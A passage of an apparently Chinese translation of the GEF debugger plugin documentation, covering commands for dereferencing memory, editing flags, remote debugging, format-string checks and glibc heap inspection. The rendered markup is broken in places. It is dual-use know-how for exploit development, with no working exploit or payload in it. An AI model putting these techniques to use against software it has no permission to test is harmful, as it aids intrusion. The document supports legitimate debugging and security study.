0</span><br></pre></td></tr></table></figure><ul><li>在抵达断点时显示上下文部分之前清除屏幕：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.clear_screen 1</span><br></pre></td></tr></table></figure><ul><li>不要对<code>regs</code>部分中的寄存器取消引用（更紧凑）：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.show_registers_raw 1</span><br></pre></td></tr></table></figure><ul><li>不要“显示”被调用的函数的开头。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>context.peek_calls <span class="literal">False</span></span><br></pre></td></tr></table></figure><ul><li>从寄存器视图中隐藏指定寄存器。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>context.ignore_registers <span class="string">"<span class="variable">$cs</span> <span class="variable">$ds</span> <span class="variable">$gs</span>"</span></span><br></pre></td></tr></table></figure><h2 id="dereference-命令"><a href="#dereference-命令" class="headerlink" title="dereference 命令"></a>dereference 命令</h2><p><code>dereference</code>命令（也就是PEDA中的别名<code>telescope</code>）旨在简化GDB中地址的解除引用，以确定它实际指向的内容。</p><p>这是一个有用的便利功能，可以在GDB中使用连续的“x / x”手动跟踪值。</p><p>“dereference`需要一个强制参数，一个地址（或符号或寄存器等）来取消引用：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  dereference $<span class="built_in">sp</span></span><br><span class="line"><span class="number">0x00007fffffffe258</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000400489</span>  →  <span class="keyword">hlt</span>     ← $<span class="built_in">rsp</span></span><br><span class="line">gef➤  telescope <span class="number">0x7ffff7b9d8b9</span></span><br><span class="line"><span class="number">0x00007ffff7b9d8b9</span>│+<span class="number">0x00</span>: <span class="number">0x0068732f6e69622f</span> (<span class="string">"/bin/sh"</span>?)</span><br></pre></td></tr></table></figure><p>它还可以选择接受第二个参数，即取消引用的连续地址数（默认为“1”）。</p><p>例如，如果要取消引用函数上下文中的所有堆栈条目（在64位体系结构上）：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p ($rbp - $rsp)/<span class="number">8</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">4</span></span><br><span class="line">gef➤  dereference $rsp <span class="number">5</span></span><br><span class="line"><span class="number">0x00007fffffffe170</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000400690</span>  →  push r15        ← $rsp</span><br><span class="line"><span class="number">0x00007fffffffe178</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000400460</span>  →  <span class="keyword">xor</span> ebp, ebp</span><br><span class="line"><span class="number">0x00007fffffffe180</span>│+<span class="number">0x10</span>: <span class="number">0x00007fffffffe270</span>  →  <span class="number">0x1</span></span><br><span class="line"><span class="number">0x00007fffffffe188</span>│+<span class="number">0x18</span>: <span class="number">0x1</span></span><br><span class="line"><span class="number">0x00007fffffffe190</span>│+<span class="number">0x20</span>: <span class="number">0x0000000000400690</span>  →  push r15        ← $rbp</span><br></pre></td></tr></table></figure><h2 id="edit-flags-命令"><a href="#edit-flags-命令" class="headerlink" title="edit-flags 命令"></a>edit-flags 命令</h2><p><code>edit-flags</code>命令（别名：<code>flags</code>）提供了一种快速且易于理解的方式来查看和编辑支持它的体系结构的标志寄存器。 如果没有参数，该命令将只返回一个人性化的寄存器标志显示。</p><p>可以按照以下语法提供一个或多个参数：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ flags [(+|<span class="string">-</span>|<span class="string">~)FLAGNAME ...]</span></span><br></pre></td></tr></table></figure><p>其中<code>FLAGNAME</code>是标志的名称（不区分大小写），而<code>+|-|~</code>表示是否设置，取消设置或切换标志的操作。</p><p>例如，在x86架构上，如果我们不想进行条件跳转（例如<code>jz</code>指令），但我们想要设置<code>Carry</code>标志，只需使用：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ flags -<span class="literal">ZERO</span> +CARRY</span><br></pre></td></tr></table></figure><h2 id="elf-info-命令"><a href="#elf-info-命令" class="headerlink" title="elf-info 命令"></a>elf-info 命令</h2><p><code>elf-info</code>（别名<code>elf</code>）提供了有关当前加载的ELF二进制文件的一些基本信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gef➤</span>  <span class="string">elf</span></span><br><span class="line"><span class="attr">Magic                 :</span> <span class="string">7f</span> <span class="number">45</span> <span class="string">4c</span> <span class="number">46</span></span><br><span class="line"><span class="attr">Class                 :</span> <span class="number">0x2</span> <span class="bullet">-</span> <span class="number">64</span><span class="string">-bit</span></span><br><span class="line"><span class="attr">Endianness            :</span> <span class="number">0x1</span> <span class="bullet">-</span> <span class="string">Little-Endian</span></span><br><span class="line"><span class="attr">Version               :</span> <span class="number">0x1</span></span><br><span class="line"><span class="attr">OS ABI                :</span> <span class="number">0x0</span> <span class="bullet">-</span> <span class="string">System</span> <span class="string">V</span></span><br><span class="line"><span class="attr">ABI Version           :</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">Type                  :</span> <span class="number">0x2</span> <span class="bullet">-</span> <span class="string">Executable</span></span><br><span class="line"><span class="attr">Machine               :</span> <span class="number">0x3e</span> <span class="bullet">-</span> <span class="string">x86-64</span></span><br><span class="line"><span class="attr">Program Header Table  :</span> <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="attr">Section Header Table  :</span> <span class="number">0x0000000000000c98</span></span><br><span class="line"><span class="attr">Header Table          :</span> <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="attr">ELF Version           :</span> <span class="number">0x1</span></span><br><span class="line"><span class="attr">Header size           :</span> <span class="number">0</span> <span class="string">(0x0)</span></span><br><span class="line"><span class="attr">Entry point           :</span> <span class="number">0x0000000000400460</span></span><br></pre></td></tr></table></figure><h2 id="entry-break-命令"><a href="#entry-break-命令" class="headerlink" title="entry-break 命令"></a>entry-break 命令</h2><p><code>entry-break</code>（别名<code>start</code>）命令的目标是在二进制文件中可用的最明显的入口点找到并中断。 由于二进制文件将开始运行，因此一些“PLT”条目也将被解析，从而使进一步的调试变得更容易。</p><p>它将执行以下操作：</p><p>1.查找<code>main</code>。 如果找到，设置临时断点并继续。<br>2.否则，它会查找<code>__libc_start_main</code>。 如果找到，设置临时断点并继续。<br>3.最后，如果找不到前两个符号，它将从ELF头获取入口点，设置断点并运行。 如果ELF二进制文件具有有效结构，则此情况永远不会失败。</p><p><img src="../../../../../../program/writing/images/gef/iXEEe59flVGb.png" alt="mark"></p><h2 id="eval-命令"><a href="#eval-命令" class="headerlink" title="$(eval) 命令"></a>$(eval) 命令</h2><p><code>$</code>命令试图模仿WinDBG中的<code>?</code>命令。</p><p>当提供一个参数时，它将评估表达式，并尝试以各种格式显示结果：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  $ $pc+<span class="number">1</span></span><br><span class="line"><span class="number">93824992252977</span></span><br><span class="line"><span class="number">0x555555559431</span></span><br><span class="line"><span class="number">0b10101010101010101010101010101011001010000110001</span></span><br><span class="line">b'UUUU\x941'</span><br><span class="line">b'<span class="number">1</span>\x94UUUU'</span><br><span class="line"></span><br><span class="line">gef➤  $ -<span class="number">0x1000</span></span><br><span class="line">-<span class="number">4096</span></span><br><span class="line"><span class="number">0xfffffffffffff000</span></span><br><span class="line"><span class="number">0b1111111111111111111111111111111111111111111111111111000000000000</span></span><br><span class="line">b'\xff\xff\xff\xff\xff\xff\xf0\x00'</span><br><span class="line">b'\x00\xf0\xff\xff\xff\xff\xff\xff'</span><br></pre></td></tr></table></figure><p>有两个参数，它只会计算它们之间的差值：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap libc</span><br><span class="line">Start              End                Offset             Perm</span><br><span class="line"><span class="number">0x00007ffff7812000</span> <span class="number">0x00007ffff79a7000</span> <span class="number">0x0000000000000000</span> r-x /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="number">0x00007ffff79a7000</span> <span class="number">0x00007ffff7ba7000</span> <span class="number">0x0000000000195000</span> --- /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="number">0x00007ffff7ba7000</span> <span class="number">0x00007ffff7bab000</span> <span class="number">0x0000000000195000</span> r-- /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="number">0x00007ffff7bab000</span> <span class="number">0x00007ffff7bad000</span> <span class="number">0x0000000000199000</span> rw- /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"></span><br><span class="line">gef➤  $ <span class="number">0x00007ffff7812000</span> <span class="number">0x00007ffff79a7000</span></span><br><span class="line"><span class="number">-1658880</span></span><br><span class="line"><span class="number">1658880</span></span><br><span class="line"></span><br><span class="line">gef➤  $ <span class="number">1658880</span></span><br><span class="line"><span class="number">1658880</span></span><br><span class="line"><span class="number">0x195000</span></span><br><span class="line"><span class="number">0</span>b110010101000000000000</span><br><span class="line">b<span class="string">'\x19P\x00'</span></span><br><span class="line">b<span class="string">'\x00P\x19'</span></span><br></pre></td></tr></table></figure><h2 id="format-string-helper-命令"><a href="#format-string-helper-命令" class="headerlink" title="format-string-helper 命令"></a>format-string-helper 命令</h2><p><code>format-string-helper</code>命令将创建一个<code>GEF</code>特定类型的断点，专门用于在使用GlibC库时检测可能不安全的格式字符串。</p><p>它将针对多个目标使用此新断点，包括：</p><ul><li><code>printf()</code></li><li><code>sprintf()</code></li><li><code>fprintf()</code></li><li><code>snprintf()</code></li><li><code>vsnprintf()</code></li></ul><p>只需调用该命令即可启用此功能。</p><p>“fmtstr-helper`是一个较短的别名。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ fmtstr-<span class="keyword">helper</span></span><br></pre></td></tr></table></figure><p>然后开始执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ r</span><br></pre></td></tr></table></figure><p>如果找到潜在的不安全条目，则断点将触发，停止进程执行，显示触发的原因以及关联的上下文。</p><p><img src="../../../../../../program/writing/images/gef/d9Niw46L8MkV.png" alt="mark"></p><h2 id="functions-命令"><a href="#functions-命令" class="headerlink" title="functions 命令"></a>functions 命令</h2><p><code>functions</code>命令将列出GEF提供的所有 <a href="https://sourceware.org/gdb/onlinedocs/gdb/Convenience-Funs.html" target="_blank" rel="noopener">便利功能</a>。</p><ul><li><code>$_bss([offset])</code> — 返回当前的bss基址加上给定的偏移量。</li><li><code>$_got([offset])</code> — 返回当前的bss基址加上给定的偏移量。</li><li><code>$_heap([offset])</code> — 返回当前堆基地址加上可选的偏移量。</li><li><code>$_pie([offset])</code> — 返回当前的PIE基地址和可选的偏移量。</li><li><code>$_stack([offset])</code> — 返回当前栈基址加上可选的偏移量。</li></ul><p>这些函数可以用作其他命令的参数，以动态计算值。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  deref $_heap() l4</span><br><span class="line"><span class="number">0x0000000000602000</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000000000</span>     ← $r8</span><br><span class="line"><span class="number">0x0000000000602008</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000000021</span> (<span class="string">"!"</span>?)</span><br><span class="line"><span class="number">0x0000000000602010</span>│+<span class="number">0x10</span>: <span class="number">0x0000000000000000</span>     ← $rax, $rdx</span><br><span class="line"><span class="number">0x0000000000602018</span>│+<span class="number">0x18</span>: <span class="number">0x0000000000000000</span></span><br><span class="line">gef➤  deref $_heap(<span class="number">0x20</span>) l4</span><br><span class="line"><span class="number">0x0000000000602020</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000000000</span>     ← $rsi</span><br><span class="line"><span class="number">0x0000000000602028</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000020fe1</span></span><br><span class="line"><span class="number">0x0000000000602030</span>│+<span class="number">0x10</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x0000000000602038</span>│+<span class="number">0x18</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h2 id="gef-remote-命令"><a href="#gef-remote-命令" class="headerlink" title="gef-remote 命令"></a>gef-remote 命令</h2><p>可以在远程调试环境中使用<code>gef</code>。 所需文件将自动下载并缓存在临时目录（大多数Unix系统上的<code>/tmp/gef</code>）中。如果更改目标文件，请记得手动删除缓存，否则<code>gef</code>将使用旧的版本。</p><h3 id="使用本地副本"><a href="#使用本地副本" class="headerlink" title="使用本地副本"></a>使用本地副本</h3><p>如果你想远程调试你已经拥有的二进制文件，你只需要告诉<code>gdb</code>在哪里找到调试信息。</p><p>例如，如果我们想调试<code>uname</code>，我们在服务器上执行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdbserver 0.0.0.0:1234 /bin/uname</span><br><span class="line">Process /bin/uname created; pid = 32280</span><br><span class="line">Listening on<span class="built_in"> port </span>1234</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/t05eFPr522sI.png" alt="mark"></p><p>在客户端上，只需运行<code>gdb</code>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb /bin/uname</span><br><span class="line">gef➤ target remote 192.168.56.1:1234</span><br><span class="line">Process /bin/uname created; pid = 10851</span><br><span class="line">Listening on<span class="built_in"> port </span>1234</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb</span><br><span class="line">gef➤ file /bin/uname</span><br><span class="line">gef➤ target remote <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><h3 id="没有本地副本"><a href="#没有本地副本" class="headerlink" title="没有本地副本"></a>没有本地副本</h3><p>可以使用<code>gdb</code>内部函数来复制我们的目标二进制文件。</p><p>按照前面的例子，如果我们想调试<code>uname</code>，运行<code>gdb</code>并连接到我们的<code>gdbserver</code>。 为了能够在<code>/proc</code>结构中找到正确的进程，命令<code>gef-remote</code>需要1个参数，即目标主机和端口。 必须提供选项<code>-p</code>并指示远程主机上的进程PID，仅当使用扩展模式（<code>-E</code>）时。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gdb</span><br><span class="line">gef➤ gef-remote <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>:<span class="number">1234</span></span><br><span class="line">[+] Connected <span class="keyword">to</span> <span class="string">'192.168.56.1:1234'</span></span><br><span class="line">[+] Downloading remote information</span><br><span class="line">[+] Remote information loaded, remember <span class="keyword">to</span> clean <span class="string">'/tmp/gef/10851'</span> <span class="keyword">when</span> your <span class="keyword">session</span> <span class="keyword">is</span> <span class="keyword">over</span></span><br></pre></td></tr></table></figure><p>正如您所看到的，如果找不到调试信息，<code>gef</code>将尝试自动下载目标文件并存储在本地临时目录中（在大多数Unix的<code>/tmp</code>上）。 如果成功，它将自动将调试信息加载到<code>gdb</code>并继续调试。</p><p><img src="../../../../../../program/writing/images/gef/h64lqkdzYbXq.png" alt="mark"></p><p>然后，您可以将下载的文件重新用于将来的调试会话，在IDA使用它等。 这使得整个远程调试过程（特别是对于Android应用程序）变得很简单。</p><h3 id="QEMU用户模式"><a href="#QEMU用户模式" class="headerlink" title="QEMU用户模式"></a>QEMU用户模式</h3><p>虽然GDB通过QEMU用户工作，但QEMU仅支持<code>gdbremote</code>协议中存在的所有命令的有限子集。 例如，不支持诸如<code>remote get</code>或<code>remote put</code>（分别从远程目标下载和上载文件）的命令。 因此，<code>gef</code>的默认<code>remote</code>模式也不起作用，因为<code>gef</code>将无法获取远程<code>procfs</code>的内容。</p><p>为了避免这种情况并且仍然享受QEMU用户的<code>gef</code>功能，可以人工添加一个简单的存根，使用<code>geq-remote</code>选项<code>-q</code>选项。 请注意，您需要首先正确设置架构：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-<span class="meta">arm</span> -g <span class="number">1234</span> ./my/<span class="meta">arm</span>/<span class="keyword">binary</span></span><br><span class="line"><span class="keyword">$ </span>gdb-<span class="keyword">multiarch </span>./my/<span class="meta">arm</span>/<span class="keyword">binary</span></span><br><span class="line"><span class="keyword">gef➤ </span> set architecture <span class="meta">arm</span></span><br><span class="line"><span class="symbol">gef</span>➤  gef-remote -q localhost:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/Cs1C5IVOF5OC.png" alt="mark"></p><h2 id="heap-命令"><a href="#heap-命令" class="headerlink" title="heap 命令"></a>heap 命令</h2><p><code>heap</code>命令提供有关指定为参数的堆块的信息。 目前，它只支持GlibC堆格式 (参见 <a href="http://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk" target="_blank" rel="noopener">this link</a> 获取<code>malloc</code>结构信息)。子命令的语法很简单：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap <span class="tag">&lt;<span class="name">sub_commands</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="heap-chunks-命令"><a href="#heap-chunks-命令" class="headerlink" title="heap chunks 命令"></a><code>heap chunks</code> 命令</h3><p>展示堆段的所有<code>chunks</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap chunks</span><br></pre></td></tr></table></figure><p>在某些情况下，分配将从内存页的头立即开始。 如果是，请指定第一个块的基址，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap chunks <span class="tag">&lt;<span class="name">LOCATION</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/6eHfdOMRR4F1.png" alt="mark"></p><h3 id="heap-chunk-命令"><a href="#heap-chunk-命令" class="headerlink" title="heap chunk 命令"></a><code>heap chunk</code> 命令</h3><p>此命令提供Glibc malloc-ed chunked的可视信息。 只需将地址提供给chunk 的用户内存指针，以显示与特定chunk 相关的信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap chunk <span class="tag">&lt;<span class="name">LOCATION</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/F5pqpSDoeWLP.png" alt="mark"></p><h3 id="heap-arenas-命令"><a href="#heap-arenas-命令" class="headerlink" title="heap arenas 命令"></a><code>heap arenas</code> 命令</h3><p>多线程程序有不同的分配区，而且<code>main_arena</code>的知识还不够。 <code>gef</code>因此提供<code>arena</code>子命令，以帮助您<strong>在调用命令</strong>时列出程序中分配的所有分配区。</p><p><img src="../../../../../../program/writing/images/gef/UsKFmCOSR198.png" alt="mark"></p><h3 id="heap-set-arena-命令"><a href="#heap-set-arena-命令" class="headerlink" title="heap set-arena 命令"></a><code>heap set-arena</code> 命令</h3><p>如果调试符号不存在（例如静态剥离的二进制文件），则可以指示GEF使用以下命令在不同的位置找到<code>main_arena</code>：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gef➤</span> <span class="string">heap </span><span class="built_in">set-arena</span> &lt;<span class="string">LOCATION&gt;</span></span><br></pre></td></tr></table></figure><p>如果分配区地址正确，则所有<code>heap</code>命令都将起作用，并使用指定的地址为<code>main_arena</code>。</p><h3 id="heap-bins-命令"><a href="#heap-bins-命令" class="headerlink" title="heap bins 命令"></a><code>heap bins</code> 命令</h3><p>Glibc使用bins来保存已被<code>free</code>的<code>chunk</code>。 这是因为通过<code>sbrk</code>（需要系统调用）进行分配开销很大。 Glibc使用这些bins来记住以前分配的<code>chunk</code>。 因为bin是单链表或双链表，我发现总是查询<code>gdb</code>以获取指针地址，取消引用它，获取值<code>chunk</code>等等是非常痛苦的…所以我决定实现<code>heap bin</code> 子命令，允许获取以下信息：</p><ul><li><p><code>fastbins</code></p></li><li><pre><code>  bins  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `unsorted`</span><br><span class="line">- `small bins`</span><br><span class="line">- `large bins`</span><br><span class="line"></span><br><span class="line">#### `heap bins fast` 命令</span><br><span class="line"></span><br><span class="line">在利用堆损坏漏洞时，有时可以方便地了解`fastbinsY`数组的状态。</span><br><span class="line"></span><br><span class="line">`fast`子命令通过显示此列表中的fastbins列表来帮助实现。 没有任何其他参数，它将显示`main_arena`的信息。 它接受一个可选参数，即另一个arena的地址（您可以使用`heap arenas`轻松找到它）。</span><br></pre></td></tr></table></figure>gef➤ heap bins fast[+] FastbinsY of arena 0x7ffff7dd5b20Fastbin[0] 0x00Fastbin[1]  →  FreeChunk(0x600310)  →  FreeChunk(0x600350)Fastbin[2] 0x00Fastbin[3] 0x00Fastbin[4] 0x00Fastbin[5] 0x00Fastbin[6] 0x00Fastbin[7] 0x00Fastbin[8] 0x00Fastbin[9] 0x00<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 其他的 `heap bins X` 命令</span><br><span class="line"></span><br><span class="line">`heap bins`的所有其他子命令的工作方式与`fast`相同。 如果没有提供参数，`gef`将回退到`main_arena`。 否则，它将使用指向`malloc_state`结构的基址的地址并相应地打印出信息。</span><br><span class="line"></span><br><span class="line">## heap-analysis-helper 命令</span><br><span class="line"></span><br><span class="line">`heap-analysis-helper` 命令旨在通过跟踪和分析内存块的分配和释放来帮助识别Glibc堆不一致的过程。</span><br><span class="line"></span><br><span class="line">目前，可以跟踪以下问题：</span><br><span class="line"></span><br><span class="line">- NULL free</span><br><span class="line">- Use-after-Free</span><br><span class="line">- Double Free</span><br><span class="line">- Heap overlap</span><br><span class="line"></span><br><span class="line">可以通过运行命令简单地激活帮助程序`heap-analysis-helper`。</span><br></pre></td></tr></table></figure>gef➤ heap-analysis[+] Tracking malloc()[+] Tracking free()[+] Disabling hardware watchpoints (this may increase the latency)[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.[+] To disable, clear the malloc/free breakpoints (`delete breakpoints`) and restore hardware breakpoints (`set can-use-hw-watchpoints 1`)<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">帮助程序将创建专门设计的破坏程序以保持分配，从而发现<span class="emphasis">_潜在的_</span>漏洞。一旦激活，只需清除<span class="code">`__GI___libc_free()`</span>和 <span class="code">`__GI___libc_malloc()`</span>即可禁用堆分析断点。也可以通过<span class="code">`gef config`</span>命令启用/禁用手动准时检查。</span><br><span class="line"></span><br><span class="line">允许以下设置:</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`check_null_free`</span>: 在遇到free(NULL)时中断执行(默认情况下禁用);</span><br><span class="line"><span class="bullet">- </span><span class="code">`check_double_free`</span>: 在遇到double free时中断执行;</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/KQc0DvUfXSAe.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`check_weird_free`</span>: 针对执行<span class="code">`free()`</span>非跟踪指针调用时 ;</span><br><span class="line"><span class="bullet">- </span><span class="code">`check_uaf`</span>: 在遇到可能的Use-after-Free条件时中断执行。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/5SjIBzH3Fs9P.png</span>)</span><br><span class="line"></span><br><span class="line">就像格式字符串漏洞助手一样，<span class="code">`heap-analysis-helper`</span> 可能无法检测复杂的堆场景和/或提供一些误报警报。必须手动确定每个发现。</span><br><span class="line"></span><br><span class="line"><span class="code">`heap-analysis-helper`</span>还可以用来简单地跟踪的内存块的分配和释放。可以通过将上述所有配置设置为False来简单地启用跟踪：</span><br></pre></td></tr></table></figure>gef➤  gef config heap-analysis-helper.check_double_free Falsegef➤  gef config heap-analysis-helper.check_free_null Falsegef➤  gef config heap-analysis-helper.check_weird_free Falsegef➤  gef config heap-analysis-helper.check_uaf False<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后，<span class="code">`gef`</span>不会通知您检测到的任何不一致，而只是在分配/释放块时显示清除消息。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/dTaI196yILj4.png</span>)</span><br><span class="line"></span><br><span class="line">要获取有关当前跟踪的块的信息，请使用<span class="code">`show`</span> 子命令：</span><br></pre></td></tr></table></figure>gef➤  heap-analysis-helper show<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/npjygP5CzXjp.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## help 命令</span></span><br><span class="line"></span><br><span class="line">显示已加载命令的帮助菜单。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/MdOdtPeNdFTO.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## hexdump 命令</span></span><br><span class="line"></span><br><span 